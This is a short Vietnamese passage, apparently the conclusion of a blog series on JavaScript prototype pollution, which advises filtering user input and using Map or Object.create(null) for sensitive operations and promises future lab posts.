Không có giải pháp nào là tuyệt đối 100%, nhưng nếu anh em kết hợp việc **lọc đầu vào** và **sử dụng Map/Object.create(null)** cho các tác vụ nhạy cảm, kẻ tấn công sẽ rất khó để tìm được khe hở.

Hy vọng chuỗi bài này giúp anh em hiểu sâu hơn về "mặt tối" của JavaScript và cách bảo vệ code của mình. Hẹn gặp lại anh em ở những bài lab "xoắn não" tiếp theo!

prototype-pollution là một minh chứng cho thấy sự linh hoạt của JavaScript đôi khi lại là con dao hai lưỡi. Hiểu rõ về cơ chế kế thừa và luôn cẩn trọng với dữ liệu người dùng là chìa khóa để xây dựng một ứng dụng an toàn.
